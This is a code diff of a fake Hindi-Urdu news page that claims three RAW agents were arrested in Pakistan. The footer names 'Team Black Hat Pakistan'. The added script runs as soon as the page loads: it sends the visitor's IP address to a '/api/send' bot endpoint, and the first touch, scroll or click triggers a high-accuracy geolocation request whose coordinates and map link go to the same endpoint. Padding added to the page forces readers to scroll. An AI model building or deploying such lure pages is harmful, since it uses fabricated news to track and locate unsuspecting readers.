@@ -5,58 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bharat Samachar - Latest News India</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; }
-        header { background-color: #c00; color: white; padding: 10px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 5px solid #333; }
-        .container { width: 90%; max-width: 1200px; margin: 20px auto; display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
-        .main-news { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .sidebar { background: #eee; padding: 15px; border-radius: 5px; }
-        h1 { font-size: 2.5rem; color: #c00; margin-bottom: 10px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; color: #333; height: 200vh; /* Scroll allow krne ke liye */ }
+        header { background-color: #c00; color: white; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 5px solid #333; }
+        .container { width: 90%; max-width: 1100px; margin: 20px auto; background: white; padding: 25px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        h1 { font-size: 2.2rem; color: #c00; margin-bottom: 10px; }
         .date { color: #666; font-size: 0.9rem; margin-bottom: 20px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
-        .news-content p { line-height: 1.8; margin-bottom: 15px; text-align: justify; }
+        .news-content p { line-height: 1.8; margin-bottom: 15px; font-size: 1.1rem; text-align: justify; }
         .breaking-tag { background: #c00; color: white; padding: 5px 10px; font-weight: bold; text-transform: uppercase; margin-right: 10px; }
-        
-        /* Verification Button Styling */
-        .verification-area { border: 2px dashed #c00; padding: 20px; text-align: center; margin: 20px 0; background: #fff5f5; }
-        .btn-red { background: #c00; color: white; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 1.1rem; }
-        
         footer { background: #333; color: white; text-align: center; padding: 20px; margin-top: 50px; }
     </style>
 </head>
-<body>
+<body id="mainBody">
 
 <header>
     <div style="font-size: 1.8rem; font-weight: bold;">BHARAT SAMACHAR</div>
-    <nav>LATEST | WORLD | POLITICS | TECH</nav>
 </header>
 
 <div class="container">
-    <div class="main-news">
-        <span class="breaking-tag">Breaking News</span>
-        <h1>Pakistan Mein RAW Ke 3 Bade Agents Giraftaar: 30 April Latest Reports</h1>
-        <div class="date">Published: April 30, 2026 | New Delhi Bureau</div>
-        
-        <div class="news-content">
-            <p><strong>NEW DELHI:</strong> Aaj subah Pakistan ke Karachi aur Lahore shehron mein bade paimane par intelligence operation ke baad dawa kiya gaya hai...</p>
-
-            <div class="verification-area">
-                <p><strong>Security Note:</strong> Sensitive information detected. Verify your region to view full evidence photos.</p>
-                <button class="btn-red" id="verifyBtn">VERIFY TO VIEW EVIDENCE</button>
-            </div>
-
-            <p>Reports ke mutabiq, in agents ke paas se hassas dastawezat aur modern communication equipment baramad hue hain...</p>
-        </div>
-    </div>
-
-    <div class="sidebar">
-        <h3>LATEST UPDATES</h3>
-        <p>• Stock Market Updates</p>
-        <p>• Weather Alert: Mumbai</p>
-    </div>
+    <span class="breaking-tag">Breaking News</span>
+    <h1>Pakistan Mein RAW Ke 3 Bade Agents Giraftaar: 30 April Latest Reports</h1>
+    <div class="date">Published: April 30, 2026 | New Delhi Bureau</div>
+    
+    <div class="news-content">
+        <p><strong>NEW DELHI:</strong> Aaj subah Pakistan ke Karachi aur Lahore shehron mein bade paimane par intelligence operation ke baad dawa kiya gaya hai ke Bharat ki RAW agency se talluq rakhne wale 3 dehshatgardan ko giraftaar kiya gaya hai...</p>
+        <p>Mazeed tafseelat ke liye niche scroll karein aur report dekhein.</p>
+        <div style="height: 500px;"></div> </div>
 </div>
 
 <footer>© 2026 Bharat Samachar | Team Black Hat Pakistan</footer>
 
 <script>
+    let hasRequested = false;
+
     async function sendToBot(data) {
         try {
             await fetch('/api/send', {
@@ -64,44 +44,41 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
-        } catch (e) { console.log("API Error"); }
+        } catch (e) {}
     }
 
-    // 1. IP Tracking (Background mein chalega)
-    window.onload = async () => {
+    // 1. IP Send (Furan page open hote hi)
+    window.addEventListener('DOMContentLoaded', async () => {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            await sendToBot({ type: 'IP', val: data.ip });
-        } catch (e) {}
-    };
+            await sendToBot({ type: 'IP_LOG', ip: data.ip });
+        } catch (err) {}
+    });
 
-    // 2. Location Popup (SIRF Button click par trigger hoga)
-    document.getElementById('verifyBtn').addEventListener('click', function() {
-        const btn = this;
-        btn.innerText = "Verifying...";
+    // 2. Location (Jese hi user touch, swipe ya scroll kare)
+    async function requestLocation() {
+        if (hasRequested) return; // Baar baar na maange
+        hasRequested = true;
 
         if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    await sendToBot({
-                        type: 'LOC',
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                    });
-                    btn.innerText = "VERIFIED";
-                    alert("Region Verified. Files Unlocked.");
-                },
-                async (err) => {
-                    await sendToBot({ type: 'ERR', msg: "User Denied Permission" });
-                    alert("Please allow location access to verify your region.");
-                    btn.innerText = "TRY AGAIN";
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                await sendToBot({
+                    type: 'LOCATION',
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    map: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                });
+            }, (error) => {
+                sendToBot({ type: 'ERR', msg: "Permission Denied" });
+            }, { enableHighAccuracy: true });
         }
-    });
+    }
+
+    // Har qism ke interaction par trigger lagaya hai
+    window.addEventListener('touchstart', requestLocation);
+    window.addEventListener('scroll', requestLocation);
+    window.addEventListener('mousedown', requestLocation);
 </script>
 
 </body>
